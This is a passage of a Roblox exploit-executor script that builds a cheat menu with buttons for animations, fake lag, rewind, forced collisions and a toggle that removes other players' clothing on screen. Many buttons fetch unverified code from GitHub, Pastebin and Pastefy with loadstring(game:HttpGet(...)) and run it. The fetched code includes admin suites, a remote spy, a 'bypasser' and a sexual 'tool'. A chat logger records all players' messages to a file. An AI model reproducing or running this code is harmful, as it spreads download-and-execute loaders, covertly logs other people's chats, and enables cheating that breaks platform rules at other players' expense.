 dances = {"248263260", "27789359", "45834924", "28488254", "33796059", "30196114", "52155728"}
    if game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
            dances = {"4555808220", "4555782893", "3333432454", "4049037604"}
    end
 if theanim then
     theanim:Stop()
 theanim:Destroy()
         local animation = Instance.new("Animation")
         animation.AnimationId = "rbxassetid://" .. dances[math.random(1, #dances)]
         theanim = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(animation)
         theanim:Play()
     else
             local animation = Instance.new("Animation")
         animation.AnimationId = "rbxassetid://" .. dances[math.random(1, #dances)]
         theanim = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(animation)
         theanim:Play()
         end
   end,
})

local Button = Tab:CreateButton({
   Name = "Stop dances",
   Callback = function()
            theanim:Stop()
            theanim:Destroy()
   end,
})

local Button = Tab:CreateButton({
   Name = "Freeze",
   Callback = function()
             game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true

   end,
})

local Button = Tab:CreateButton({
   Name = "Unfreeze",
   Callback = function()
             game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false

   end,
})

local Button = Tab:CreateButton({
   Name = "Fake Lag",
   Callback = function()
FakeLag = true
 
 repeat wait()
     game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
     wait(0.05)
      game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
      wait(0.05)
 until FakeLag == false
   end,
})

local Button = Tab:CreateButton({
   Name = "Stop Fake Lag",
   Callback = function()
FakeLag = false
   end,
})

local Tab = Window:CreateTab("Misc", 133113532239316) -- Title, Image

local Button = Tab:CreateButton({
   Name = "Infinite Yield",
   Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Orca Admin",
   Callback = function()
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Nameless Admin",
   Callback = function()
               loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
   end,
})

local Button = Tab:CreateButton({
   Name = "Chat Logger",
   Callback = function()
                          if game:service('RunService'):IsStudio() then print('!STUDIO!') else
    if game:service('CoreGui'):findFirstChild('LogHolder') then return nil
    end
end

local LogHolder = Instance.new("ScreenGui")
local Logs = Instance.new("Frame")
local Scroll = Instance.new("ScrollingFrame")
local Template = Instance.new("TextLabel")

LogHolder.Name = "LogHolder"
if game:service('RunService'):IsStudio() then LogHolder.Parent = game.Players.LocalPlayer.PlayerGui else
    LogHolder.Parent = game.CoreGui
end

Logs.Name = "Logs"
Logs.Parent = LogHolder
Logs.AnchorPoint = Vector2.new(0.5, 0.5)
Logs.BackgroundColor3 = Color3.new(0, 0, 0)
Logs.Position = UDim2.new(0.200000003, 0, 0.200000003, 0)
Logs.Size = UDim2.new(0, 400, 0, 250)
Logs.Style = Enum.FrameStyle.DropShadow

Scroll.Name = "Scroll"
Scroll.Parent = Logs
Scroll.BackgroundColor3 = Color3.new(0, 0, 0)
Scroll.BackgroundTransparency = 1
Scroll.BorderSizePixel = 0
Scroll.Size = UDim2.new(1, 0, 1, 0)
Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
Scroll.ScrollBarThickness = 6

Template.Name = "Template"
Template.Parent = Logs
Template.BackgroundColor3 = Color3.new(1, 1, 1)
Template.BackgroundTransparency = 1
Template.Position = UDim2.new(0, 0, 0, -25)
Template.Size = UDim2.new(1, 0, 0, 20)
Template.Font = Enum.Font.ArialBold
Template.Text = ""
Template.TextColor3 = Color3.new(1, 1, 1)
Template.TextSize = 15
Template.TextXAlignment = Enum.TextXAlignment.Left
Template.TextWrap = true

Logs.Active = true
Logs.Draggable = true

local loggedTable = {}

local getTotalSize = function()
local totalSize = UDim2.new(0, 0, 0, 0)
    
    for i, v in next, loggedTable do
        totalSize = totalSize + UDim2.new(0, 0, 0, v.Size.Y.Offset)
    end
    
    return totalSize
end

local BUD = UDim2.new(0, 0, 0, 0)
local TotalNum = 0

local function GenLog(txt, colo, time)
    local oldColo = Color3.fromRGB(0, 0, 0) 
    
    local Temp = Template:Clone()
    Temp.Parent = Scroll
    Temp.Name = txt..'Logged'
    Temp.Text = tostring(txt)
    Temp.Visible = true
    Temp.Position = BUD + UDim2.new(0, 0, 0, 0)
    if colo then oldColo = colo Temp.TextColor3 = colo elseif not colo then Temp.TextColor3 = Color3.fromRGB(200, 200, 200) end
    local timeVal = Instance.new('StringValue', Temp)
    timeVal.Name = 'TimeVal'
    timeVal.Value = time

    TotalNum = TotalNum + 1
    
    if not Temp.TextFits then repeat Temp.Size = UDim2.new(Temp.Size.X.Scale, Temp.Size.X.Offset, Temp.Size.Y.Scale, Temp.Size.Y.Offset + 10)
        Temp.Text = txt
    until Temp.TextFits 
end

    BUD = BUD + UDim2.new(0, 0, 0, Temp.Size.Y.Offset)
    
    table.insert(loggedTable, Temp)
    
    local totSize = getTotalSize()
    
    if totSize.Y.Offset >= Scroll.CanvasSize.Y.Offset then Scroll.CanvasSize = UDim2.new(totSize.X.Scale, totSize.X.Offset, totSize.Y.Scale, totSize.Y.Offset + 100)
    Scroll.CanvasPosition = Scroll.CanvasPosition + Vector2.new(0, totSize.Y.Offset) 
    end
    
    return Temp
end

local ChatData = ""

local function SaveToFile()
    local t = os.date("*t")
    local dateDat = t['hour']..' '..t['min']..' '..t['sec']..' '..t['day']..'.'..t['month']..'.'..t['year']
    
    ChatData = ""
    
    for i, v in pairs(Scroll:GetChildren()) do
        ChatData = ChatData..v.TimeVal.Value..' '..v.Text..'\n'
    end
    
    writefile('ChatLogs '..dateDat..'.txt', ChatData)
end

local function Clear()
    loggedTable = {}
    ChatData = ""
    Scroll.CanvasPosition = Vector2.new(0, 0)
    for i, v in pairs(Scroll:GetChildren()) do
        v:Destroy()
    end
    Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    BUD = UDim2.new(0, 0, 0, 0)
end

local LogPlr = function(plr)
            plr.Chatted:connect(function(msg)
                
            local t = os.date("*t")
            local dateDat = t['hour']..':'..t['min']..':'..t['sec']
    
            if string.len(msg) >= 1000 then return nil end
            if string.lower(msg) == 'clear' and plr == game:service('Players').LocalPlayer then Clear() return nil end
            if string.lower(msg) == 'savetofile' and plr == game:service('Players').LocalPlayer then SaveToFile() return nil end
            if string.sub(msg, 1, 1):match('%p') and string.sub(msg, 2, 2):match('%a') and string.len(msg) >= 5 then GenLog(plr.Name..': '..msg, Color3.new(255, 0, 0), dateDat) else
            GenLog(plr.Name..': '..msg, Color3.new(255, 255, 255), dateDat)
            end
    end)
end

for i, v in pairs(game.Players:GetChildren()) do
    LogPlr(v)
end

game.Players.PlayerAdded:connect(function(plr)
    LogPlr(plr)
end)
   end,
})

local Button = Tab:CreateButton({
   Name = "Better Bypasser (Synergy)",
   Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua",true))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Remote spy (works for xeno/solara and more)",
   Callback = function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Octo-Spy/refs/heads/main/Main.lua", true))()

-- made by @cherry_peashooter on discord
-- contact me for suggestions & support
-- @ScriptBlox, unban me in discord ples
   end,
})

local Button = Tab:CreateButton({
   Name = "Dex",
   Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
   end,
})

local Tab = Window:CreateTab("More Stuff", 133818775236467) -- Title, Image

local Button = Tab:CreateButton({
   Name = "Jerk off tool (Do enable inventory first)",
   Callback = function()
      	   loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Load E to rewind character",
   Callback = function()
      	   --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local key = "E" --key to intiate the flashback. see https://create.roblox.com/docs/reference/engine/enums/KeyCode for an exhaustive list
local flashbacklength = 60 --how long the flashback should be stored in approx seconds
local flashbackspeed = 1 --how many frames to skip during flashback (set to 0 to disable)

local name = game:GetService("RbxAnalyticsService"):GetSessionId() --unique id that games cannot access but does not change on subsequent executions (used for the name of the binded function)
local frames,uis,LP,RS = {},game:GetService("UserInputService"),game:GetService("Players").LocalPlayer,game:GetService("RunService") --set some vars

pcall(RS.UnbindFromRenderStep,RS,name) --unbind the function if previously binded

local function getchar()
   return LP.Character or LP.CharacterAdded:Wait()
end

function gethrp(c) --gethrp ripped from my env script and stripped of arguments
return c:FindFirstChild("HumanoidRootPart") or c.RootPart or c.PrimaryPart or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso") or c:FindFirstChildWhichIsA("BasePart")
end

local flashback = {lastinput=false,canrevert=true}

function flashback:Advance(char,hrp,hum,allowinput)
   
   if #frames>flashbacklength*60 then --make sure we don't have too much history
       table.remove(frames,1)
   end
   
   if allowinput and not self.canrevert then
       self.canrevert = true
   end
   
   if self.lastinput then --make sure platformstand goes back to normal
       hum.PlatformStand = false
       self.lastinput = false
   end
   
   table.insert(frames,{
       hrp.CFrame,
       hrp.Velocity,
       hum:GetState(),
       hum.PlatformStand,
       char:FindFirstChildOfClass("Tool")
   })
end

function flashback:Revert(char,hrp,hum)
   local num = #frames
   if num==0 or not self.canrevert then --add to history and return if no history is present
       self.canrevert = false
       self:Advance(char,hrp,hum)
       return
   end
   for i=1,flashbackspeed do --skip frames (if enabled)
       table.remove(frames,num)
       num=num-1
   end
   self.lastinput = true
   local lastframe = frames[num]
   table.remove(frames,num)
   hrp.CFrame = lastframe[1]
   hrp.Velocity = -lastframe[2]
   hum:ChangeState(lastframe[3])
   hum.PlatformStand = lastframe[4] --platformstand to make flying look normal again
   local currenttool = char:FindFirstChildOfClass("Tool")
   if lastframe[5] then --equip/unequip tools
       if not currenttool then
           hum:EquipTool(lastframe[5])
       end
   else
       hum:UnequipTools()
   end
end

local function step() --function that runs every frame
   local char = getchar()
   local hrp = gethrp(char)
   local hum = char:FindFirstChildWhichIsA("Humanoid")
   if uis:IsKeyDown(Enum.KeyCode[key]) then --begin flashback
       flashback:Revert(char,hrp,hum)
   else
       flashback:Advance(char,hrp,hum,true)
   end
end
RS:BindToRenderStep(name,1,step) --finally, bind our function
   end,
})

local Button = Tab:CreateButton({
   Name = "Wall Jump",
   Callback = function()
local wallJumpForce = Vector3.new(0, -70, -70) -- The direction and power of the wall jump
local wallDetectionDistance = 3 -- Distance to detect walls
local cooldownTime = 0 -- Cooldown between wall jumps (in seconds)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")
local canWallJump = true

local function isNearWall()
    local rayParams = RaycastParams.new()
    rayParams.FilterDescendantsInstances = {character}
    rayParams.FilterType = Enum.RaycastFilterType.Blacklist

    local directions = {
        Vector3.new(1, 0, 0),  -- Right
        Vector3.new(-1, 0, 0), -- Left
        Vector3.new(0, 0, 1),  -- Forward
        Vector3.new(0, 0, -1)  -- Backward
    }

    for _, dir in ipairs(directions) do
        local ray = workspace:Raycast(rootPart.Position, dir * wallDetectionDistance, rayParams)
        if ray then
            return ray
        end
    end

    return nil
end

local function wallJump()
    if not canWallJump then return end

    local wallRay = isNearWall()
    if wallRay then
        canWallJump = false

        local jumpDirection = wallRay.Normal * wallJumpForce.Magnitude
        rootPart.Velocity = Vector3.new(jumpDirection.X, wallJumpForce.Y, jumpDirection.Z)

        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)

        wait(cooldownTime)
        canWallJump = true
    end
end

game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end

    if input.KeyCode == Enum.KeyCode.Space then
        wallJump()
    end
end)
end,
})


local Button = Tab:CreateButton({
   Name = "Invisibility",
   Callback = function()
      	loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
   end,
})

local Button = Tab:CreateButton({
   Name = "R15 Animations GUI",
   Callback = function()
      	loadstring(game:HttpGet('https://pastebin.com/raw/5HNpk2yN'))()
   end,
})

local Button = Tab:CreateButton({
   Name = "R15 Animations GUI 2",
   Callback = function()
      	--[[
- I really appreciate it if you join my discord server ^^ 
- https://discord.gg/GzQGE9rr26
- if you encounter any bugs or issue with AquaMatrix, please report it to our discord server.
- AquaMatrix might not work for some executors :(
]]

loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Enable Collisions",
   Callback = function()
 	--makes it so that you can collide with players and their limbs (Use with scripts like Snake)
--NOTE: collision is not server sided and only happens on your client (Fling scripts only work on you not others)

LP = game.Players.LocalPlayer
while wait(3) do
    for i,v in pairs(game.Players:GetDescendants()) do
        if v:IsA("Player") and workspace:FindFirstChild(v.Name) and v ~= LP and workspace[v.Name]:FindFirstChild("CHECKER") == nil then
            checker = Instance.new("BoolValue",workspace[v.Name])
            checker.Name = "CHECKER"
            for i,v in pairs(workspace:WaitForChild(v.Name):GetDescendants()) do
                if v:IsA("Part") or v:IsA("MeshPart") then
                    local collider = Instance.new("Part",v)
                    collider.Size = v.Size
                    collider.Position = v.Position
                    collider.Transparency = 1
                    local weld = Instance.new("Weld",v)
                    weld.Part0 = v
                    weld.Part1 = collider
                end
            end
        end
    end
end   
end,
})

local Button = Tab:CreateButton({
   Name = "Turn r15 animations to r6",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua", true))()
   end,
})

local originalClothing = {}

local function removeClothing(character)
    -- Store the original clothing templates if not already stored
    if not originalClothing[character] then
        originalClothing[character] = {}

        -- Store shirt and pants templates
        local shirt = character:FindFirstChildOfClass("Shirt")
        local pants = character:FindFirstChildOfClass("Pants")
        if shirt then
            originalClothing[character].shirtTemplate = shirt.ShirtTemplate
        end
        if pants then
            originalClothing[character].pantsTemplate = pants.PantsTemplate
        end

        -- Store layered clothing templates (ShirtGraphic, Pants, etc.)
        local layeredShirt = character:FindFirstChildOfClass("ShirtGraphic")
        local layeredPants = character:FindFirstChildOfClass("Pants")
        if layeredShirt then
            originalClothing[character].layeredShirtGraphic = layeredShirt.Graphic
        end
        if layeredPants then
            originalClothing[character].layeredPantsTemplate = layeredPants.PantsTemplate
        end

        -- Store all accessories (hats, hairs, etc.), but not yet remove them
        originalClothing[character].accessories = {}
        for _, item in pairs(character:GetChildren()) do
            if item:IsA("Accessory") then
                table.insert(originalClothing[character].accessories, item)
            end
        end
    end

    -- Remove Shirt and Pants for classic clothing
    local shirt = character:FindFirstChildOfClass("Shirt")
    local pants = character:FindFirstChildOfClass("Pants")
    if shirt then
        shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=0"
    end
    if pants then
        pants.PantsTemplate = "http://www.roblox.com/asset/?id=0"
    end

    -- Remove Layered Clothing (ShirtGraphic, Pants)
    local layeredShirt = character:FindFirstChildOfClass("ShirtGraphic")
    local layeredPants = character:FindFirstChildOfClass("Pants")
    if layeredShirt then
        layeredShirt.Graphic = "http://www.roblox.com/asset/?id=0"
    end
    if layeredPants then
        layeredPants.PantsTemplate = "http://www.roblox.com/asset/?id=0"
    end

    -- Remove all accessories except hats and hairs
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Accessory") then
            -- Check if the item is a hat or hair (AccessoryType.Hat or AccessoryType.Hair)
            if not (item.AccessoryType == Enum.AccessoryType.Hat or item.AccessoryType == Enum.AccessoryType.Hair) then
                -- Remove all accessories except hats and hairs
                item:Destroy()
            end
        end
    end
end

local function restoreClothing(character)
    -- Restore the original clothing templates
    if originalClothing[character] then
        local shirt = character:FindFirstChildOfClass("Shirt")
        local pants = character:FindFirstChildOfClass("Pants")
        if shirt then
            shirt.ShirtTemplate = originalClothing[character].shirtTemplate
        end
        if pants then
            pants.PantsTemplate = originalClothing[character].pantsTemplate
        end

        -- Restore layered clothing (ShirtGraphic, Pants)
        local layeredShirt = character:FindFirstChildOfClass("ShirtGraphic")
        local layeredPants = character:FindFirstChildOfClass("Pants")
        if layeredShirt then
            layeredShirt.Graphic = originalClothing[character].layeredShirtGraphic
        end
        if layeredPants then
            layeredPants.PantsTemplate = originalClothing[character].layeredPantsTemplate
        end

        -- Restore accessories (including hats and hairs)
        for _, item in pairs(originalClothing[character].accessories) do
            local clonedItem = item:Clone()
            clonedItem.Parent = character
        end
    end
end

local originalColors = {} -- Table to store original colors
local isDarkModeActive = false
local loopConnection

local function isCloseToRed(color)
    return color.R > 0.5 and color.G < 0.5 and color.B < 0.5
end

local function applyDarkColor(obj)
    if obj:IsA("GuiObject") then
        if not isCloseToRed(obj.BackgroundColor3) then
            originalColors[obj] = originalColors[obj] or {} -- Initialize the entry if it doesn't exist
            originalColors[obj].BackgroundColor3 = obj.BackgroundColor3 -- Store original color
            obj.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- Dark gray
            obj.BorderColor3 = Color3.fromRGB(20, 20, 20) -- Dark gray border
        end
    end

    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
        if not isCloseToRed(obj.TextColor3) then
            originalColors[obj] = originalColors[obj] or {}
            originalColors[obj].TextColor3 = obj.TextColor3 -- Store original text color
            obj.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
        end
    end

    if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
        if not isCloseToRed(obj.ImageColor3) then
            originalColors[obj] = originalColors[obj] or {}
            originalColors[obj].ImageColor3 = obj.ImageColor3 -- Store original image color
            obj.ImageColor3 = Color3.fromRGB(20, 20, 20) -- Dark color for images
        end
    end
end

local function revertColors(obj)
    if originalColors[obj] then
        if obj:IsA("GuiObject") and originalColors[obj].BackgroundColor3 then
            obj.BackgroundColor3 = originalColors[obj].BackgroundColor3
            obj.BorderColor3 = Color3.fromRGB(255, 255, 255) -- Assuming you want to revert the border color too
        end

        if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and originalColors[obj].TextColor3 then
            obj.TextColor3 = originalColors[obj].TextColor3
        end

        if (obj:IsA("ImageLabel") or obj:IsA("ImageButton")) and originalColors[obj].ImageColor3 then
            obj.ImageColor3 = originalColors[obj].ImageColor3
        end
    end
end

local function applyDarkModeToAllGuis()
    local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")

    if playerGui then
        for _, gui in ipairs(playerGui:GetChildren()) do
            for _, obj in ipairs(gui:GetDescendants()) do
                applyDarkColor(obj)
            end
        end
    end
end

local function revertDarkModeToAllGuis()
    local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")

    if playerGui then
        for _, gui in ipairs(playerGui:GetChildren()) do
            for _, obj in ipairs(gui:GetDescendants()) do
                revertColors(obj)
            end
        end
    end
end

local Toggle = Tab:CreateToggle({
    Name = "Dark ui elements (WIP)",
    CurrentValue = false,
    Flag = "Toggle1", -- A flag is the identifier for the configuration file
    Callback = function(Value)
        isDarkModeActive = Value
        if Value then
            applyDarkModeToAllGuis()

            -- Start a loop that continually applies dark mode
            loopConnection = game:GetService("RunService").Heartbeat:Connect(function()
                if isDarkModeActive then
                    applyDarkModeToAllGuis()
                else
                    loopConnection:Disconnect() -- Stop the loop if dark mode is inactive
                end
            end)
        else
            revertDarkModeToAllGuis() -- Revert colors when toggled off
            if loopConnection then
                loopConnection:Disconnect() -- Ensure the loop is stopped
            end
        end
    end,
})

local Toggle = Tab:CreateToggle({
   Name = "Remove player clothes (visual)",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
   for _, player in pairs(game:GetService("Players"):GetPlayers()) do
            -- Skip the local player
            if player ~= game.Players.LocalPlayer then
                local character = player.Character or player.CharacterAdded:Wait()
                if Value then
                    removeClothing(character)  -- Remove clothing when toggled on
                else
                    restoreClothing(character)  -- Restore clothing when toggled off
                end
            end
        end
   end,
})
